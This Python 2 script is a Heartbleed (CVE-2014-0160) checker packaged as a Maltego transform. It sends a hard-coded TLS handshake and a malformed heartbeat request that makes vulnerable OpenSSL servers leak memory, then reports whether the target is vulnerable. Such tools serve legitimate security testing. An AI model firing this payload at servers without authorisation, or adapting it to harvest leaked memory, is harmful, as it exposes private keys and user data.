#!/usr/bin/python

# Quick and dirty demonstration of CVE-2014-0160 by Jared Stafford (jspenguin@jspenguin.org)
# The author disclaims copyright to this source code.

# Modified for simplified checking by Yonathan Klijnsma
# Modified into a Maltego Transform by Danny Chrastil (danny.chrastil@gmail.com)

import sys
import struct
import socket
import time
import select
import re
from optparse import OptionParser
from MaltegoTransform import *

def h2bin(x):
    return x.replace(' ', '').replace('\n', '').decode('hex')
	
tf = MaltegoTransform()
target = None
hello = h2bin('''
16 03 02 00  dc 01 00 00 d8 03 02 53
43 5b 90 9d 9b 72 0b bc  0c bc 2b 92 a8 48 97 cf
bd 39 04 cc 16 0a 85 03  90 9f 77 04 33 d4 de 00
00 66 c0 14 c0 0a c0 22  c0 21 00 39 00 38 00 88
00 87 c0 0f c0 05 00 35  00 84 c0 12 c0 08 c0 1c
c0 1b 00 16 00 13 c0 0d  c0 03 00 0a c0 13 c0 09
c0 1f c0 1e 00 33 00 32  00 9a 00 99 00 45 00 44
c0 0e c0 04 00 2f 00 96  00 41 c0 11 c0 07 c0 0c
c0 02 00 05 00 04 00 15  00 12 00 09 00 14 00 11
00 08 00 06 00 03 00 ff  01 00 00 49 00 0b 00 04
03 00 01 02 00 0a 00 34  00 32 00 0e 00 0d 00 19
00 0b 00 0c 00 18 00 09  00 0a 00 16 00 17 00 08
00 06 00 07 00 14 00 15  00 04 00 05 00 12 00 13
00 01 00 02 00 03 00 0f  00 10 00 11 00 23 00 00
00 0f 00 01 01                                  
''')
hb = h2bin(''' 
18 03 02 00 03
01 40 00
''')

options = OptionParser(usage='%prog server [options]', description='[Maltego] Test for SSL heartbeat vulnerability (CVE-2014-0160)')
options.add_option('-p', '--port', type='int', default=443, help='TCP port to test (default: 443)')

def buildTransform(tf,result,msg="[safe]"):
    if result == True:
        msg = "[vuln] openssl heartbleed!" if msg == None else msg
        tf.addEntity("maltego.Phrase","OpenSSL Heartbleed")
        tf.addUIMessage(msg)
        tf.returnOutput()
    else:
        tf.addUIMessage(msg)
        tf.returnOutput()

def hexdump(s):
    for b in xrange(0, len(s), 16):
        lin = [c for c in s[b : b + 16]]
        hxdat = ' '.join('%02X' % ord(c) for c in lin)
        pdat = ''.join((c if 32 <= ord(c) <= 126 else '.' )for c in lin)
        print '  %04x: %-48s %s' % (b, hxdat, pdat)
    print

def recvall(s, length, timeout=5):
    endtime = time.time() + timeout
    rdata = ''
    remain = length
    data = None
    while remain > 0:
        rtime = endtime - time.time() 
        if rtime < 0:
            return None
        r, w, e = select.select([s], [], [], 5)
        if s in r:
            try:
                data = s.recv(remain)
            except Exception, e:
				buildTransform(tf,False,str(e))
            # EOF?
            if not data:
                return None
            rdata += data
            remain -= len(data)
    return rdata
        

def recvmsg(s):
    hdr = recvall(s, 5)
    if hdr is None:
        return None, None, None
    typ, ver, ln = struct.unpack('>BHH', hdr)
    pay = recvall(s, ln, 10)
    if pay is None:
        return None, None, None
 
    return typ, ver, pay

def hit_hb(s):
    global target
    try:
        s.send(hb)
    except Exception, e:
        buildTransform(tf,False,e)
	
    while True:
        typ, ver, pay = recvmsg(s)
        if typ is None:
            buildTransform(tf,False)
            return False

        if typ == 24:
            if len(pay) > 3:
                buildTransform(tf, True)
            else:
                buildTransform(tf,False)
            return True

        if typ == 21:
            buildTransform(tf,False)
            return False

def main():
    global target
    opts, args = options.parse_args()
    if len(args) < 1:
        options.print_help()
        return

    target = args[0]
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.connect((target, opts.port))
        s.send(hello)
    except:
        buildTransform(tf,False,"[Error] Could not connect to "+target)
    
    while True:
        typ, ver, pay = recvmsg(s)
        if typ == None:
            buildTransform(tf,False)
            return
        # Look for server hello done message.
        if typ == 22 and ord(pay[0]) == 0x0E:
            break
    
    try:
        s.send(hb)
        hit_hb(s)
    except Exception, e:
        buildTransform(tf,False,str(e))
		
	print "test2"

if __name__ == '__main__':
    main()
